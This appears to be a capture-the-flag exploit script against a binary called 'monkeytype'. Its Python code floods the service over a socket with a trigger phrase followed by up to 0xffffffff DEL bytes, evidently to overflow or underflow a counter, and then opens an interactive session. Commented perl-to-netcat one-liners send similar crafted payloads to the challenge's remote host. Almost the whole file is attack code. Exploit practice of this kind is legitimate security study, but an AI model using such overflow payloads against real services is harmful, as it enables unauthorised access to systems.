import socket
import telnetlib

s = socket.socket()
#s.connect(('34.124.157.94', 12321))
s.connect(('127.0.0.1', 10000)) # socat TCP-LISTEN:10000,reuseaddr,fork EXEC:./monkeytype
t = telnetlib.Telnet()
t.sock = s

t.write(b'I will take over the world! Mojo!\n')
for i in range(0xffffffff):
    print('\r', i, end='')
    t.write(b'\x7F')
print("Done")
t.write(b'hello world \n\n')

t.interact()

    


# (perl -e 'print "\xFF"x64; print "\n"; print "\x61"x100'; cat) | nc 34.124.157.94 12321

# (perl -e 'print "I will take over the world! Mojo!"; print "\x7F"x33; print "aaaaaa\n";  '; cat) | nc 34.124.157.94 12321

# (perl -e 'print "\x76\n"x65;'; cat) | nc 34.124.157.94 12321

# 2147483647

# (perl -e ' print "\x7F" x (0xffffffff); print "ABCDEFGH"; ') | nc 34.124.157.94 12321